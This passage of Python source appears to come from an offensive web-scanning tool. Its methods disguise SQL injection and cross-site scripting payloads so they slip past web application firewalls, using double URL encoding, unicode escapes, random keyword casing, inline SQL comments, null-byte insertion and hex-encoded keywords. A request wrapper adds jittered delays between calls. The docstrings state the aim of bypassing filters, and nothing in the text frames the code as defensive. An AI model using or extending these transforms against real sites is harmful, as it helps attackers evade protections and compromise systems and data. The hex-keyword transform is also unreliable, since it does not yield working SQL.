    def _url_encode(self, payload):
        """Standard URL encoding of special chars."""
        return urllib.parse.quote(payload)

    def _double_url_encode(self, payload):
        """Bypasses WAFs that decode only once before analyzing."""
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _unicode_encode(self, payload):
        """Unicode encoding (e.g. < -> %u003c)"""
        encoded = ""
        for char in payload:
            if not char.isalnum():
                encoded += f"%u00{hex(ord(char))[2:].zfill(2)}"
            else:
                encoded += char
        return encoded

    def _case_switch(self, payload):
        """Randomize case of SQL/HTML keywords (SeLeCt, ScRiPt)."""
        keywords = ['select', 'union', 'insert', 'update', 'delete', 'drop', 'script',
                     'alert', 'onerror', 'onload', 'eval', 'from', 'where', 'order',
                     'group', 'having', 'limit', 'and', 'or', 'not', 'null']
        result = payload
        for kw in keywords:
            if kw in result.lower():
                randomized = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in kw)
                # Case-insensitive replace
                import re
                result = re.sub(re.escape(kw), randomized, result, flags=re.IGNORECASE)
        return result

    def _comment_insert(self, payload):
        """Insert SQL comments inside keywords (SEL/**/ECT) to break pattern matching."""
        sql_keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'FROM', 'WHERE', 'ORDER']
        result = payload
        for kw in sql_keywords:
            if kw.lower() in result.lower():
                # Split keyword in half and insert comment
                mid = len(kw) // 2
                broken = kw[:mid] + "/**/" + kw[mid:]
                import re
                result = re.sub(re.escape(kw), broken, result, flags=re.IGNORECASE)
        return result

    def _null_byte_insert(self, payload):
        """Insert null bytes (%00) before keywords — some WAFs stop parsing at null."""
        triggers = ['<script', '<img', 'onerror', 'onload', 'UNION', 'SELECT']
        result = payload
        for t in triggers:
            if t.lower() in result.lower():
                import re
                result = re.sub(re.escape(t), "%00" + t, result, flags=re.IGNORECASE, count=1)
        return result

    def _hex_encode_keywords(self, payload):
        """Hex-encode SQL keywords (e.g., SELECT -> 0x53454c454354)."""
        sql_keywords = ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for kw in sql_keywords:
            if kw.lower() in result.lower():
                hex_val = "0x" + kw.encode().hex()
                import re
                result = re.sub(re.escape(kw), hex_val, result, flags=re.IGNORECASE)
        return result

    def request(self, method, url, **kwargs):
        """Legacy wrapper — maintained for backward compat but session is preferred."""
        import requests
        if self.rate_limit_delay > 0:
            time.sleep(self.rate_limit_delay + random.uniform(0.1, 0.5))
        return requests.request(method, url, **kwargs)
